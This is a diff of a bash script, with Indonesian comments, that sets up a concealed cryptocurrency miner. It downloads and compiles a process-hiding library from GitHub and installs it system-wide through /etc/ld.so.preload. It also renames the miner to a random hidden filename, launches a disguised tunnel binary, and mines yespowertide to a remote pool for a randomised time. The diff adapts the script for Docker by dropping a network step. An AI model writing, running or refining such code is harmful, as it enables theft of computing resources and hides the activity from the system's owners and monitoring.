@@ -1,12 +1,13 @@
 #!/bin/bash
 
-curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+# Bagian kompilasi library hider (tetap dipertahankan sesuai kebutuhanmu)
+curl -s https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
+
+# --- BAGIAN NETWORK DIHAPUS KARENA MENYEBABKAN ERROR DI DOCKER ---
 
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
@@ -14,12 +15,14 @@ cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
 rm -f /app/sr
 
+# Menjalankan tunnel/proxy
 /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
 --url 127.0.0.1:443 >/dev/null 2>&1 &
 
 DURATION=$((1200 + RANDOM % 301))
 
+# Menjalankan main process
 timeout ${DURATION}s /app/$NAME \
 -a yespowertide \
 -o 157.173.100.15:443 \
